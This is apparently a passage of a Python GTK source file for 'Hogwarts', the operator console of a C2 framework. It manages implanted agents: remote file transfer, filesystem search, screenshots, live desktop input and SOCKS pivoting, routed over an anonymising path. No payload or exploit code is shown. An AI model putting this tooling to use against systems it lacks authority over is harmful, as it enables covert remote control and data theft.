"""Hogwarts main page — two-pane C2 desk shell."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import gi

gi.require_version("Gtk", "4.0")
gi.require_version("Gdk", "4.0")
from gi.repository import Gdk, GLib, Gtk  # noqa: E402
# GdkPixbuf used only via agents panel for frames

from hogwarts import __version__
from hogwarts.backend.client import C2Client
from hogwarts.backend.config import PlaneConfig, load_plane_config, save_plane_config
from hogwarts.net import socks_tcp_probe, tcp_probe
from hogwarts.panels.agents import AgentsPanel
from hogwarts.panels.channel import ChannelPanel
from hogwarts.panels.console import ConsolePanel
from hogwarts.panels.egress import EgressPanel
from hogwarts.panels.listener import ListenerPanel
from hogwarts.panels.log import LogPanel
from hogwarts.panels.ops import OpsPanel
from hogwarts.panels.plane import PlanePanel
from hogwarts.store import MetaStore
from hogwarts.theme import apply_css


def _user_downloads_dir() -> Path:
    d = Path.home() / "Downloads"
    try:
        d.mkdir(parents=True, exist_ok=True)
    except OSError:
        pass
    return d


def _user_pictures_dir() -> Path:
    """~/Pictures/Hogwarts — screenshot archive root."""
    d = Path.home() / "Pictures" / "Hogwarts"
    try:
        d.mkdir(parents=True, exist_ok=True)
    except OSError:
        pass
    return d


def _safe_filename(name: str, *, default: str = "download.bin") -> str:
    # Basename only (works for /unix and C:\Windows paths)
    base = Path(str(name).replace("\\", "/")).name
    safe = "".join(c if c.isalnum() or c in "._- ()[]+@" else "_" for c in base)
    safe = safe.strip(" ._")
    return safe[:180] if safe else default


class HogwartsPage(Gtk.Box):
    """Two-pane C2 desk: Channel · Agents · Listener · Egress · Console · Plane · Ops · Log."""

    def __init__(self, ctx) -> None:
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=0)
        self.add_css_class("page")
        self.add_css_class("hogwarts-page")
        self.set_hexpand(True)
        self.set_vexpand(True)
        self._ctx = ctx
        self._probe_busy = False
        self._log_lines: list[str] = []
        self._store = MetaStore(ctx.data_path("hogwarts.json"))
        self._plane_path = ctx.data_path("plane.json")
        self._plane = load_plane_config(self._plane_path)
        self._poll_source: int | None = None
        self._live_desktop_agent: str | None = None
        self._live_desktop_source: int | None = None
        self._live_desktop_busy = False
        self._events_since: str | None = None
        self._poll_busy = False
        self._c2: C2Client | None = None
        self._page_mapped = False
        self._fs_index_source: int | None = None
        # T5 SSE live events (poll remains fleet/tasks + fallback)
        self._sse_stop: threading.Event | None = None
        self._sse_thread: threading.Thread | None = None
        self._sse_alive = False
        self._sse_fail_streak = 0
        apply_css(self)
        self.connect("destroy", lambda *_: self._on_destroy())
        # Stack hides non-visible pages — pause heavy work when Hogwarts is off-rail
        self.connect("map", lambda *_: self._on_map())
        self.connect("unmap", lambda *_: self._on_unmap())

        # Sticky clearnet-risk strip (Reach Settings → Privacy opt-out)
        self._policy_warn = self._build_policy_warn_bar()
        self.append(self._policy_warn)
        self._sync_policy_warn()

        # Header
        header = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=12)
        header.add_css_class("hogwarts-header")
        header.set_hexpand(True)
        titles = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=1)
        titles.set_hexpand(True)
        titles.set_valign(Gtk.Align.CENTER)
        t = Gtk.Label(label="Hogwarts", xalign=0)
        t.add_css_class("hogwarts-title")
        titles.append(t)
        s = Gtk.Label(label="C2 keep · channel · agents · plane", xalign=0)
        s.add_css_class("hogwarts-sub")
        titles.append(s)
        header.append(titles)

        self._chip = Gtk.Label(label="—")
        self._chip.add_css_class("hogwarts-chip")
        self._chip.set_valign(Gtk.Align.CENTER)
        header.append(self._chip)

        self._plane_chip = Gtk.Label(label="PLANE OFF")
        self._plane_chip.add_css_class("hogwarts-chip")
        self._plane_chip.set_valign(Gtk.Align.CENTER)
        header.append(self._plane_chip)

        refresh = Gtk.Button()
        refresh.set_icon_name("view-refresh-symbolic")
        refresh.add_css_class("flat")
        refresh.set_tooltip_text("Refresh channel + plane")
        refresh.set_valign(Gtk.Align.CENTER)
        refresh.connect("clicked", lambda *_: self._refresh_all())
        header.append(refresh)
        self.append(header)

        # Split body
        split = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=0)
        split.add_css_class("hogwarts-split")
        split.set_hexpand(True)
        split.set_vexpand(True)

        side = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=4)
        side.add_css_class("hogwarts-sidebar")
        side.set_vexpand(True)
        side.set_hexpand(False)
        side.set_size_request(210, -1)

        side_lab = Gtk.Label(label="Desk", xalign=0)
        side_lab.add_css_class("hogwarts-section")
        side_lab.set_margin_start(8)
        side_lab.set_margin_bottom(6)
        side.append(side_lab)

        self._stack = Gtk.Stack()
        self._stack.add_css_class("hogwarts-stack")
        self._stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        self._stack.set_transition_duration(160)
        self._stack.set_hexpand(True)
        self._stack.set_vexpand(True)
        self._stack.set_halign(Gtk.Align.FILL)
        self._stack.set_valign(Gtk.Align.FILL)

        meta = self._store.load()
        self._channel = ChannelPanel(
            on_copy_socks=self._copy_socks,
            on_run_egress=lambda *_: self._run_probes(),
            on_open_export=self._open_export,
            on_save_listener=lambda *_: self._save_listener(quiet=False),
            on_export_playbook=self._export_playbook,
            on_marketplace=lambda *_: self._go_marketplace(),
        )
        self._agents = AgentsPanel(
            on_refresh=self._refresh_agents,
            on_task=self._create_task,
            on_refresh_tasks=self._refresh_tasks,
            on_cancel_task=self._cancel_task,
            on_fetch_file=self._fetch_file_assembled,
            on_push_file=self._push_file_chunked,
            on_fs_list=self._fs_list_remote,
            on_fs_preview=self._fs_preview_remote,
            on_fs_index_start=self._fs_index_start,
            on_fs_index_status=self._fs_index_status,
            on_fs_index_stop=self._fs_index_stop,
            on_fs_search=self._fs_search_remote,
            on_screenshot=self._screenshot_remote,
            on_live_desktop=self._live_desktop_toggle,
            on_desktop_session=self._desktop_session,
            on_desktop_input=self._desktop_input_remote,
            on_socks_start=self._socks_start_for_agent,
            data_dir=str(self._ctx.data_path()),
        )
        self._listener = ListenerPanel(
            meta,
            on_save=self._save_listener,
            on_copy=self._copy_listener_line,
            on_probe=self._probe_listener,
            on_plane_pull=self._listeners_pull,
            on_plane_push=self._listeners_push,
        )
        last_rows = meta.get("last_probe_rows")
        self._egress = EgressPanel(
            on_run=self._run_probes,
            on_custom=self._probe_custom,
            last_rows=last_rows if isinstance(last_rows, list) else None,
            last_ts=str(meta.get("last_probe_ts") or ""),
        )
        self._console = ConsolePanel(on_command=self._console_command)
        self._plane_panel = PlanePanel(
            self._plane,
            on_save=self._save_plane,
            on_test=self._test_plane,
            on_start=self._start_plane,
        )
        self._plane_start_busy = False
        self._ops = OpsPanel(
            str(self._ctx.data_path()),
            on_open_export=self._open_export,
            on_export_playbook=self._export_playbook,
            on_open_data=self._open_data,
            on_save_playbook=self._save_playbook_fields,
            on_export_agent=self._export_agent_zip,
        )
        meta_pb = meta.get("playbook")
        if isinstance(meta_pb, dict):
            self._ops.load_playbook(meta_pb)
        self._ops.set_canary_domain(str(meta.get("canary_domain") or ""))
        self._ops.refresh_export_ledger(meta)
        self._log = LogPanel(on_clear=self._clear_log)

        nav_items = (
            ("channel", "Channel", "network-wired-symbolic", self._channel),
            ("agents", "Agents", "system-users-symbolic", self._agents),
            ("listener", "Jobs", "network-server-symbolic", self._listener),
            ("egress", "Egress", "network-transmit-receive-symbolic", self._egress),
            ("console", "Console", "utilities-terminal-symbolic", self._console),
            ("plane", "Plane", "network-workgroup-symbolic", self._plane_panel),
            ("ops", "Ops kit", "folder-symbolic", self._ops),
            ("log", "Session log", "document-open-recent-symbolic", self._log),
        )

        self._nav_group: Gtk.ToggleButton | None = None
        for key, label, icon, widget in nav_items:
            widget.set_hexpand(True)
            widget.set_vexpand(True)
            widget.set_halign(Gtk.Align.FILL)
            widget.set_valign(Gtk.Align.FILL)
            self._stack.add_named(widget, key)
            btn = Gtk.ToggleButton()
            btn.add_css_class("hogwarts-nav-btn")
            btn.set_hexpand(True)
            row = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
            row.set_margin_start(4)
            ic = Gtk.Image.new_from_icon_name(icon)
            ic.set_pixel_size(16)
            row.append(ic)
            lab = Gtk.Label(label=label, xalign=0)
            lab.set_hexpand(True)
            row.append(lab)
            btn.set_child(row)
            if self._nav_group is None:
                self._nav_group = btn
                btn.set_active(True)
            else:
                btn.set_group(self._nav_group)
            btn.connect("toggled", self._on_nav, key)
            side.append(btn)

        spacer = Gtk.Box()
        spacer.set_vexpand(True)
        side.append(spacer)
        ver = Gtk.Label(label=f"v{__version__}", xalign=0.5)
        ver.add_css_class("hogwarts-muted")
        ver.set_margin_bottom(4)
        side.append(ver)

        split.append(side)
        main = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=0)
        main.add_css_class("hogwarts-main")
        main.set_hexpand(True)
        main.set_vexpand(True)
        main.append(self._stack)
        split.append(main)
        self.append(split)

        self._stack.set_visible_child_name("channel")
        self._refresh_all()
        # Poll starts on first map (avoid background HTTP while page is built but hidden)
        self._log_msg("Hogwarts ready")

    def _on_nav(self, btn: Gtk.ToggleButton, key: str) -> None:
        if btn.get_active():
            self._stack.set_visible_child_name(key)
            # Flush deferred session log when opening Log (we skip set_text while hidden)
            if key == "log" and self._log_lines:
                try:
                    self._log.set_text("\n".join(self._log_lines))
                except Exception:
                    pass

    def _build_policy_warn_bar(self) -> Gtk.Widget:
        """Non-dismissible yellow strip when sensitive ops are allowed without a path."""
        bar = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        bar.add_css_class("hogwarts-policy-warn")
        bar.set_hexpand(True)
        bar.set_halign(Gtk.Align.FILL)
        # No close control — sticky while the Reach privacy opt-out is on
        try:
            ic = Gtk.Image.new_from_icon_name("dialog-warning-symbolic")
        except Exception:
            ic = Gtk.Image.new_from_icon_name("dialog-information-symbolic")
        ic.set_pixel_size(16)
        ic.set_valign(Gtk.Align.CENTER)
        bar.append(ic)
        lab = Gtk.Label(
            label=(
                "Sensitive ops allowed without a path · clearnet risk · "
                "Settings → Privacy"
            ),
            xalign=0,
            wrap=True,
        )
        lab.add_css_class("hogwarts-policy-warn-label")
        lab.set_hexpand(True)
        lab.set_valign(Gtk.Align.CENTER)
        bar.append(lab)
        return bar

    def _sync_policy_warn(self) -> None:
        """Show sticky bar only when Reach allows Operate without a path."""
        bar = getattr(self, "_policy_warn", None)
        if bar is None:
            return
        show = False
        ctx = getattr(self, "_ctx", None)
        if ctx is not None:
            if hasattr(ctx, "allows_sensitive_without_path"):
                try:
                    show = bool(ctx.allows_sensitive_without_path())
                except Exception:
                    show = False
            else:
                # Fallback if older Reach host lacks the helper
                svc = getattr(ctx, "services", None)
                cfg = getattr(svc, "config", None) if svc is not None else None
                if cfg is not None:
                    show = bool(getattr(cfg, "allow_sensitive_without_path", False))
        bar.set_visible(show)

    def _on_map(self) -> None:
        self._page_mapped = True
        self._sync_policy_warn()
        if self._plane.is_configured:
            self._start_event_poll()
            self._start_event_stream()

    def _on_unmap(self) -> None:
        self._page_mapped = False
        # Leaving Hogwarts: stop timers so Reach does not keep polling plane forever
        self._stop_event_stream()
        self._stop_event_poll()
        self._stop_live_and_index()

    def _stop_live_and_index(self) -> None:
        if self._live_desktop_source is not None:
            try:
                GLib.source_remove(self._live_desktop_source)
            except Exception:
                pass
            self._live_desktop_source = None
        self._live_desktop_agent = None
        self._live_desktop_busy = False
        if self._fs_index_source is not None:
            try:
                GLib.source_remove(self._fs_index_source)
            except Exception:
                pass
            self._fs_index_source = None
        try:
            self._stop_keepstream_client()
        except Exception:
            pass
        try:
            self._agents.stop_live_ui()
        except Exception:
            pass

    def _on_destroy(self) -> None:
        self._page_mapped = False
        self._stop_event_stream()
        self._stop_event_poll()
        self._stop_live_and_index()
        if self._c2 is not None:
            try:
                self._c2.close()
            except Exception:
                pass
            self._c2 = None

    def cleanup(self) -> None:
        """Explicit teardown when Reach removes the plugin page without destroy."""
        self._on_destroy()

    def _client(self) -> C2Client:
        """Reuse one keep-alive client for the desk lifetime."""
        if self._c2 is None:
            self._c2 = C2Client(self._plane)
        else:
            # Pick up token/URL edits without dropping keep-alive when URL unchanged
            old = (self._c2.config.base_url or "").rstrip("/")
            new = (self._plane.base_url or "").rstrip("/")
            if old != new:
                self._c2.close()
                self._c2 = C2Client(self._plane)
            else:
                self._c2.config = self._plane
        return self._c2

    def _refresh_all(self) -> None:
        self._sync_policy_warn()
        self._refresh_status()
        if self._plane.is_configured:
            self._refresh_agents(quiet=True)

    def _refresh_status(self) -> None:
        state = "offline"
        state_label = "Core offline"
        path = "—"
        socks = "—"
        hops = "—"
        fp = "—"
        try:
            # Use Reach status cache — force=True fought the UI-thread budget every poll
            st = self._ctx.services.core.status(force=False)
            sv = getattr(getattr(st, "state", None), "value", str(getattr(st, "state", "")))
            path = str(getattr(st, "path_summary", None) or "—")
            socks = str(getattr(st, "local_proxy", None) or "").strip() or "—"
            hl = list(getattr(st, "hops", None) or [])
            hops = " → ".join(hl) if hl else "—"
            fp = str(getattr(st, "fingerprint_note", None) or "—").strip() or "—"
            if sv == "connected":
                state = "live"
                state_label = "Path up"
            elif sv == "connecting":
                state = "busy"
                state_label = "Connecting…"
            elif sv == "disconnected":
                state = "idle"
                state_label = "Not connected"
            else:
                state = "off"
                state_label = sv or "Unknown"
        except Exception as exc:
            state = "off"
            state_label = "Unavailable"
            path = str(exc)

        plane_txt = "not configured"
        if self._plane.is_configured:
            plane_txt = self._plane.base_url
            if self._plane_chip.get_text() != "PLANE":
                self._plane_chip.set_text("PLANE")
            self._plane_chip.add_css_class("hogwarts-chip-plane")
        else:
            if self._plane_chip.get_text() != "PLANE OFF":
                self._plane_chip.set_text("PLANE OFF")
            self._plane_chip.remove_css_class("hogwarts-chip-plane")

        self._channel.set_path_status(
            state=state,
            state_label=state_label,
            path=path,
            socks=socks,
            hops=hops,
            fp=fp,
            plane=plane_txt,
        )
        chip_txt = state_label.upper()
        if self._chip.get_text() != chip_txt:
            self._chip.set_text(chip_txt)
        if state == "live":
            self._chip.add_css_class("hogwarts-chip-live")
        else:
            self._chip.remove_css_class("hogwarts-chip-live")

    def _save_plane(self) -> None:
        cfg = self._plane_panel.read_config()
        save_plane_config(self._plane_path, cfg)
        self._plane = cfg
        self._log_msg(f"Plane saved → {cfg.base_url or '(empty)'}")
        self._refresh_status()
        if self._page_mapped:
            self._start_event_poll()
            self._start_event_stream()
        if self._ctx.toast:
            self._ctx.toast("Plane config saved")

    def _stop_event_poll(self) -> None:
        if self._poll_source is not None:
            try:
                GLib.source_remove(self._poll_source)
            except Exception:
                pass
            self._poll_source = None

    def _stop_event_stream(self) -> None:
        """Stop T5 SSE worker."""
        self._sse_alive = False
        stop = getattr(self, "_sse_stop", None)
        if stop is not None:
            stop.set()
        self._sse_stop = None
        self._sse_thread = None

    def _start_event_stream(self) -> None:
        """Long-lived SSE for plane events; poll still handles fleet/tasks."""
        self._stop_event_stream()
        if not self._plane.is_configured:
            return
        if not self._events_since:
            self._events_since = datetime.now(timezone.utc).strftime(
                "%Y-%m-%dT%H:%M:%SZ"
            )
        stop = threading.Event()
        self._sse_stop = stop
        self._sse_alive = False
        self._sse_fail_streak = 0

        def worker() -> None:
            while not stop.is_set():
                if not getattr(self, "_page_mapped", False):
                    break
                try:
                    client = self._client()
                    since = self._events_since
                    for kind, payload in client.open_event_stream(
                        since=since, stop_flag=stop
                    ):
                        if stop.is_set():
                            break
                        if kind == "hello":
                            self._sse_alive = True
                            self._sse_fail_streak = 0

                            def _hello() -> bool:
                                self._log_msg("Live events SSE connected")
                                return False

                            GLib.idle_add(_hello)
                            continue
                        if kind == "bye":
                            break
                        if kind != "plane" or not isinstance(payload, dict):
                            continue
                        from hogwarts.backend.client import _parse_event

                        ev = _parse_event(payload)

                        def _push(e=ev) -> bool:
                            self._ingest_events([e], source="sse")
                            return False

                        GLib.idle_add(_push)
                    self._sse_alive = False
                except Exception as exc:
                    self._sse_alive = False
                    self._sse_fail_streak = int(
                        getattr(self, "_sse_fail_streak", 0)
                    ) + 1
                    if self._sse_fail_streak <= 2:

                        def _err(msg=str(exc)) -> bool:
                            self._log_msg(f"SSE events: {msg} — poll fallback")
                            return False

                        GLib.idle_add(_err)
                if stop.is_set():
                    break
                # Backoff before reconnect
                delay = min(30.0, 2.0 * max(1, self._sse_fail_streak))
                stop.wait(delay)
            self._sse_alive = False

        th = threading.Thread(
            target=worker, name="hogwarts-sse", daemon=True
        )
        self._sse_thread = th
        th.start()

    def _ingest_events(
        self, events_out: list[Any], *, source: str = "poll"
    ) -> None:
        """Advance event cursor + calm console (shared by poll and SSE)."""
        if not events_out:
            return
        last_ts = None
        on_console = False
        try:
            on_console = self._stack.get_visible_child_name() == "console"
        except Exception:
            on_console = False
        seen: set[str] = getattr(self, "_console_event_seen", set())
        serious = []
        for e in events_out:
            lvl = str(getattr(e, "level", "") or "").lower()
            if lvl not in ("error", "warn", "warning"):
                # Still advance cursor for info/ok
                if getattr(e, "ts", None):
                    last_ts = e.ts
                continue
            ch = str(getattr(e, "channel", None) or "")
            msg = str(getattr(e, "message", None) or "")
            if ch == "task" and (
                "queued type=" in msg
                or "check-in" in msg.lower()
                or "succeeded" in msg.lower()
                or "assigned" in msg.lower()
            ):
                if getattr(e, "ts", None):
                    last_ts = e.ts
                continue
            msg_norm = msg
            for tok in msg.split():
                if tok.startswith("tsk_") or tok.startswith("agt_"):
                    msg_norm = msg_norm.replace(tok, "<id>")
            key = f"{lvl}|{ch}|{msg_norm}"
            if key in seen:
                if getattr(e, "ts", None):
                    last_ts = e.ts
                continue
            serious.append(e)
            seen.add(key)
            if getattr(e, "ts", None):
                last_ts = e.ts
        for e in events_out:
            if getattr(e, "ts", None):
                last_ts = e.ts
        if len(seen) > 80:
            seen = set(list(seen)[-40:])
        self._console_event_seen = seen
        if on_console:
            # SSE can deliver faster — still cap lines per batch
            cap = 4 if source == "sse" else 2
            for e in serious[-cap:]:
                ts = e.ts.strftime("%H:%M:%S") if e.ts else "?"
                msg = str(e.message or "")
                if len(msg) > 220:
                    msg = msg[:217] + "…"
                self._console.append_out(
                    f"[{ts}] {e.level}/{e.channel} {msg}"
                )
        if last_ts is not None:
            self._events_since = last_ts.isoformat().replace("+00:00", "Z")

    def _start_event_poll(self) -> None:
        """Auto-pull fleet/tasks; events via SSE when alive, else poll."""
        self._stop_event_poll()
        if not self._plane.is_configured:
            return
        # Start cursor at "now" so we never dump historical check-ins into the console
        if not self._events_since:
            self._events_since = datetime.now(timezone.utc).strftime(
                "%Y-%m-%dT%H:%M:%SZ"
            )
        # Floor 4s — sub-4s is thrashy for long desk sessions
        interval = max(4, int(float(self._plane.poll_interval_sec or 5)))
        self._poll_source = GLib.timeout_add_seconds(interval, self._poll_tick)
        self._poll_gen = 0
        self._console_event_seen: set[str] = getattr(
            self, "_console_event_seen", set()
        )
        # Session log only — not the interactive console
        self._log_msg(f"Background poll every {interval}s (SSE when available)")

    def _poll_tick(self) -> bool:
        if not self._plane.is_configured:
            return False
        # Page not shown — do not accumulate HTTP + GTK work
        if not self._page_mapped or not self.get_mapped():
            return True
        if self._poll_busy:
            return True
        self._poll_busy = True
        since = self._events_since
        agent_id = self._agents.selected_agent_id()
        self._poll_gen = int(getattr(self, "_poll_gen", 0)) + 1
        on_detail = False
        nav = ""
        try:
            on_detail = self._agents._view_stack.get_visible_child_name() == "detail"
            nav = self._stack.get_visible_child_name() or ""
        except Exception:
            pass
        # Fleet only when Agents is visible
        want_fleet = nav == "agents" and (
            (not on_detail and self._poll_gen % 2 == 1)
            or (agent_id is None and self._poll_gen % 3 == 1)
        )
        # Events: poll only when SSE is down (or Console open and SSE cold)
        sse_up = bool(getattr(self, "_sse_alive", False))
        want_events = (not sse_up) and (
            nav == "console" or self._poll_gen % 4 == 1
        )
        # Tasks: only while viewing an agent in Agents
        want_tasks = bool(agent_id) and nav == "agents" and on_detail
        want_channel = self._poll_gen % 3 == 1

        # Snapshot filter + gen so a mid-flight filter switch cannot paint a
        # dead archived roster (or wipe hover targets) after user picks All.
        fleet_status = self._agents.filter_status() if want_fleet else None
        fleet_q = self._agents.query() if want_fleet else None
        fleet_gen = int(getattr(self._agents, "_fleet_gen", 0)) if want_fleet else 0

        def work() -> None:
            events_out: list[Any] = []
            agents = None
            tasks = None
            err: str | None = None
            try:
                client = self._client()
                if want_events:
                    events_out = client.poll_events(since=since, limit=20)
                if want_fleet:
                    agents = client.list_agents(
                        status=fleet_status,
                        q=fleet_q or None,
                    )
                if want_tasks and agent_id:
                    try:
                        tasks = client.list_tasks(agent_id, limit=40)
                    except Exception:
                        tasks = None
            except Exception as exc:
                err = str(exc)
                agents = None
                tasks = None

            def done() -> bool:
                self._poll_busy = False
                # Drop UI work if page was closed/unmapped mid-request
                if not getattr(self, "_page_mapped", True) or not self.get_mapped():
                    return True
                if err:
                    return True
                if want_channel:
                    try:
                        self._refresh_status()
                    except Exception:
                        pass
                if events_out:
                    self._ingest_events(events_out, source="poll")
                if agents is not None:
                    # Stale fleet poll (filter changed while HTTP in flight)
                    if fleet_gen != int(getattr(self._agents, "_fleet_gen", fleet_gen)):
                        return True
                    self._agents.set_agents(agents, quiet=True)
                if want_tasks and agent_id and tasks is not None:
                    if self._agents.selected_agent_id() == agent_id:
                        self._agents.set_tasks(tasks)
                return True

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-poll", daemon=True).start()
        return True

    def _test_plane(self) -> None:
        # Use form values without requiring save first
        cfg = self._plane_panel.read_config()
        if not cfg.is_configured:
            self._plane_panel.set_result("Set a base URL first", ok=False)
            return

        def work() -> None:
            try:
                client = C2Client(cfg)
                data = client.health()
                msg = json.dumps(data, indent=2) if isinstance(data, dict) else str(data)
                ok = True
            except Exception as exc:
                msg = str(exc)
                ok = False
                low = msg.lower()
                if "refused" in low or "errno 111" in low or "failed to connect" in low:
                    msg += (
                        "\n\nHint: plane is not reachable. "
                        "Use Plane → Start plane (lab), or run lab/personal_setup.sh."
                    )

            def done() -> bool:
                self._plane_panel.set_result(msg, ok=ok)
                self._log_msg("Plane health " + ("ok" if ok else "fail"))
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-health", daemon=True).start()
        self._plane_panel.set_result("Testing…")

    def _start_plane(self) -> None:
        """Start a local lab plane (Docker hogwarts-plane or plane/server.py).

        Does not manage remote/production C2 — only localhost lab setups.
        """
        if self._plane_start_busy:
            return
        cfg = self._plane_panel.read_config()
        if not cfg.is_configured:
            self._plane_panel.set_result("Set a base URL first", ok=False)
            return

        self._plane_start_busy = True
        self._plane_panel.set_start_sensitive(False)
        self._plane_panel.set_result("Starting plane…")
        self._log_msg("Plane start requested")

        def work() -> None:
            lines: list[str] = []
            ok = False
            try:
                # Already healthy?
                try:
                    data = C2Client(cfg).health()
                    lines.append("Plane already healthy.")
                    lines.append(
                        json.dumps(data, indent=2) if isinstance(data, dict) else str(data)
                    )
                    ok = True
                    return
                except Exception:
                    pass

                how, detail = self._try_start_local_plane(cfg)
                lines.append(how)
                if detail:
                    lines.append(detail)

                # Wait for /health
                last_err = ""
                for i in range(40):
                    try:
                        data = C2Client(cfg).health()
                        lines.append("Health OK.")
                        lines.append(
                            json.dumps(data, indent=2)
                            if isinstance(data, dict)
                            else str(data)
                        )
                        ok = True
                        break
                    except Exception as exc:
                        last_err = str(exc)
                        if i == 0 or (i + 1) % 5 == 0:
                            lines.append(f"Waiting for health… ({i + 1}/40)")
                        time.sleep(0.5)
                if not ok:
                    lines.append(f"Plane did not become healthy: {last_err}")
                    lines.append(
                        "Try: docker start hogwarts-plane\n"
                        "  or: bash lab/personal_setup.sh"
                    )
            except Exception as exc:
                lines.append(f"Start failed: {exc}")
                ok = False
            finally:

                def done() -> bool:
                    self._plane_start_busy = False
                    self._plane_panel.set_start_sensitive(True)
                    self._plane_panel.set_result("\n".join(lines), ok=ok)
                    self._log_msg("Plane start " + ("ok" if ok else "fail"))
                    if ok:
                        self._refresh_agents(quiet=True)
                        if self._ctx.toast:
                            self._ctx.toast("Plane is up")
                    return False

                GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-start-plane", daemon=True).start()

    def _try_start_local_plane(self, cfg: PlaneConfig) -> tuple[str, str]:
        """Best-effort local lab start. Returns (summary, detail)."""
        raw = cfg.base_url if "://" in cfg.base_url else "http://" + cfg.base_url
        parsed = urlparse(raw)
        host = (parsed.hostname or "").lower()
        port = parsed.port or (443 if (parsed.scheme or "http").lower() == "https" else 80)

        local_hosts = {"127.0.0.1", "localhost", "::1"}
        if host not in local_hosts and host not in ("0.0.0.0",):
            return (
                f"Base URL host is {host!r} — Start plane only targets a local lab "
                f"(127.0.0.1 / localhost). Start your remote plane outside Hogwarts.",
                "",
            )

        token = (cfg.api_token or "dev").strip() or "dev"
        docker = shutil.which("docker")
        detail_parts: list[str] = []

        # 1) Docker: start existing container
        if docker:
            insp = subprocess.run(
                [docker, "inspect", "-f", "{{.State.Running}}", "hogwarts-plane"],
                capture_output=True,
                text=True,
                timeout=30,
            )
            if insp.returncode == 0:
                running = (insp.stdout or "").strip().lower() == "true"
                if running:
                    return ("Docker container hogwarts-plane already running.", "")
                st = subprocess.run(
                    [docker, "start", "hogwarts-plane"],
                    capture_output=True,
                    text=True,
                    timeout=60,
                )
                if st.returncode == 0:
                    return ("Started Docker container hogwarts-plane.", st.stdout.strip())
                detail_parts.append(f"docker start: {st.stderr.strip() or st.stdout.strip()}")
            else:
                # 2) Create container from lab image if present
                img = subprocess.run(
                    [docker, "image", "inspect", "hogwarts-plane:lab"],
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
                if img.returncode == 0:
                    # Ensure network (ignore errors)
                    subprocess.run(
                        [docker, "network", "create", "hogwarts-lab"],
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )
                    # Image listens on 8080 inside; map host port from plane.json URL
                    run = subprocess.run(
                        [
                            docker,
                            "run",
                            "-d",
                            "--name",
                            "hogwarts-plane",
                            "--network",
                            "hogwarts-lab",
                            "-e",
                            f"PLANE_OPERATOR_TOKEN={token}",
                            "-e",
                            "PLANE_HTTP_ADDR=0.0.0.0:8080",
                            "-e",
                            "PLANE_DB=/data/plane.db",
                            "-p",
                            f"{port}:8080",
                            "hogwarts-plane:lab",
                        ],
                        capture_output=True,
                        text=True,
                        timeout=90,
                    )
                    if run.returncode == 0:
                        return (
                            "Created and started Docker container hogwarts-plane "
                            f"(image hogwarts-plane:lab, host port {port}).",
                            (run.stdout or "").strip(),
                        )
                    detail_parts.append(
                        f"docker run: {(run.stderr or run.stdout or '').strip()}"
                    )
                else:
                    detail_parts.append(
                        "No hogwarts-plane container or hogwarts-plane:lab image."
                    )
        else:
            detail_parts.append("docker not found on PATH.")

        # 3) Local plane/server.py from plugin tree
        plugin_dir = Path(getattr(self._ctx, "plugin_dir", "") or ".").resolve()
        server_candidates = [
            plugin_dir / "plane" / "server.py",
            plugin_dir.parent / "plane" / "server.py",
            Path.home()
            / "Desktop"
            / "workspace"
            / "programs"
            / "hogwarts"
            / "plane"
            / "server.py",
        ]
        server_py = next((p for p in server_candidates if p.is_file()), None)
        if server_py is None:
            return (
                "Could not start plane via Docker or local server.py.",
                "\n".join(detail_parts)
                + "\nRun: bash ~/Desktop/workspace/programs/hogwarts/lab/personal_setup.sh",
            )

        pid_path = Path(self._ctx.data_path("personal")) / "plane-local.pid"
        pid_path.parent.mkdir(parents=True, exist_ok=True)
        log_path = pid_path.with_suffix(".log")

        # Reuse live process if pid file is valid
        if pid_path.is_file():
            try:
                old = int(pid_path.read_text().strip())
                os.kill(old, 0)
                return (f"Local plane already running (pid {old}).", str(log_path))
            except (ValueError, OSError, ProcessLookupError):
                pass

        env = os.environ.copy()
        env["PLANE_OPERATOR_TOKEN"] = token
        env["PLANE_HTTP_ADDR"] = f"127.0.0.1:{port}"
        log_f = open(log_path, "a", encoding="utf-8")
        log_f.write(f"\n--- start {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        log_f.flush()
        proc = subprocess.Popen(
            [sys.executable, str(server_py)],
            cwd=str(server_py.parent.parent),
            env=env,
            stdout=log_f,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
        pid_path.write_text(str(proc.pid) + "\n", encoding="utf-8")
        extra = "\n".join(detail_parts)
        return (
            f"Started local plane/server.py (pid {proc.pid}, {env['PLANE_HTTP_ADDR']}).",
            (extra + "\n" if extra else "") + f"log: {log_path}",
        )

    def _refresh_agents(self, quiet: bool = False) -> None:
        if not self._plane.is_configured:
            self._agents.show_empty("Configure the control plane under Plane.")
            if not quiet and self._ctx.toast:
                self._ctx.toast("Plane not configured")
            return

        status = self._agents.filter_status()
        q = self._agents.query()
        # Drop in-flight refresh results — spam-clicking Refresh used to queue
        # many idle_add callbacks that rebuilt fleet and killed hover.
        self._agents._fleet_gen = int(getattr(self._agents, "_fleet_gen", 0)) + 1
        gen = self._agents._fleet_gen

        def work() -> None:
            try:
                agents = self._client().list_agents(status=status, q=q or None)
                err = None
            except Exception as exc:
                agents = []
                err = str(exc)

            def done() -> bool:
                # Stale response from an earlier Refresh — ignore
                if gen != getattr(self._agents, "_fleet_gen", gen):
                    return False
                if err:
                    msg = err
                    low = err.lower()
                    if "refused" in low or "errno 111" in low:
                        msg = (
                            f"{err}\n\n"
                            "Plane is not running or not reachable. "
                            "Open Plane → Start plane (local lab), then refresh Agents."
                        )
                    self._agents.show_error(msg)
                    self._log_msg(f"Agents error: {msg}")
                else:
                    self._agents.set_agents(agents)
                    self._log_msg(f"Agents refreshed ({len(agents)})")
                return False

